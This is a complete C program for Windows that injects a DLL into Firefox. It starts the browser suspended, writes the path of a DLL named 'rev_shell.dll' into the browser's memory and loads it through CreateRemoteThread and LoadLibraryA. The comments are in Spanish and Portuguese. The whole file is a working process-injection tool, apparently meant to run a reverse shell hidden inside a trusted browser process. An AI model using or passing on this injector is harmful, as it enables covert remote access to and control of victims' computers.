#include <stdio.h>
#include <windows.h>
#include <string.h>
#pragma comment(lib, "ntdll.lib")

NTSTATUS NTAPI NtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID *BaseAddress, ULONG ZeroBits, PULONG RegionSize, ULONG AllocationType, ULONG Protect);
NTSTATUS NTAPI NtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T BufferSize, PSIZE_T NumberOfBytesWritten);
NTSTATUS NTAPI NtWaitForSingleObject(HANDLE Handle, BOOLEAN Alertable, PLARGE_INTEGER Timeout);


int main()
{
    const char* processName = "C:\\Program Files\\Mozilla Firefox\\firefox.exe"; // "path_to_executable.exe" 
    const char* dllPath = "C:\\Users\\Desktop\\rev_shell.dll"; // "path_to_dll.dll" 
    char processNameBuffer[MAX_PATH];  // Buffer para almacenar uma copia modificable de processName

    
    // Estructuras de datos para la creación del proceso
    STARTUPINFOA startupInfo = { sizeof(STARTUPINFO) };
    PROCESS_INFORMATION processInfo = { 0 };
   
        
    PVOID dllPathMemory = NULL;  //Asigna memoria en el proceso para almacenar la ruta de la DLL
    SIZE_T dllPathSize = strlen(dllPath) + 1;


    strcpy(processNameBuffer, processName);


    // Crea el proceso
    BOOL processoFirefox = CreateProcessA(NULL, processNameBuffer, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &startupInfo, &processInfo);

    if (!processoFirefox) { 
        fprintf(stderr, "Error al crear el proceso.\n");
        return 1;
    }

    HANDLE processHandle = processInfo.hProcess;  //Obtén el identificador del proceso
    
    NtAllocateVirtualMemory(processHandle, &dllPathMemory, 0, &dllPathSize, MEM_COMMIT, PAGE_READWRITE);

    if (!dllPathMemory)
    {
        fprintf(stderr, "Erro ao alocar memória no processo.\n");
        TerminateProcess(processHandle, 1);
        return 1;
    }

    // Escreve a rota da DLL na memória do processo
    NtWriteVirtualMemory(processHandle, dllPathMemory, (PVOID)dllPath, dllPathSize, NULL);


    // Obtiene el handle del kernel32.dll
    HMODULE kernel32Module = GetModuleHandle("kernel32.dll");
    if (!kernel32Module)
    {
        fprintf(stderr, "Error al obtener el handle de kernel32.dll.\n");
        return 1;
    }



    // Obtiene la dirección de la función LoadLibraryA de kernel32.dll
    FARPROC loadLibrary = GetProcAddress(kernel32Module, "LoadLibraryA");
    if (!loadLibrary)
    {
        fprintf(stderr, "Error al obtener la dirección de la función LoadLibraryA.\n");
        return 1;
    }

    // Crea una thread en el proceso para cargar la DLL
    HANDLE threadHandle = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibrary, dllPathMemory, 0, NULL);
    if (!threadHandle)
    {
        fprintf(stderr, "Error al crear el hilo en el proceso.\n");
        return 1;
    }

    // Espera a que el hilo termine de cargar la DLL
    if (WaitForSingleObject(threadHandle, INFINITE) == WAIT_FAILED)
    {
        fprintf(stderr, "Error al esperar a que el hilo termine.\n");
        return 1;
    }

    
    // Reanuda la ejecución del proceso
    if (ResumeThread(processInfo.hThread) == (DWORD)-1)
    {
        fprintf(stderr, "Error al reanudar el proceso.\n");
        return 1;
    }


    // Espera a que el proceso termine
    NtWaitForSingleObject(threadHandle, FALSE, NULL);

    
    CloseHandle(processHandle);
    CloseHandle(processInfo.hThread);

    return 0;
}
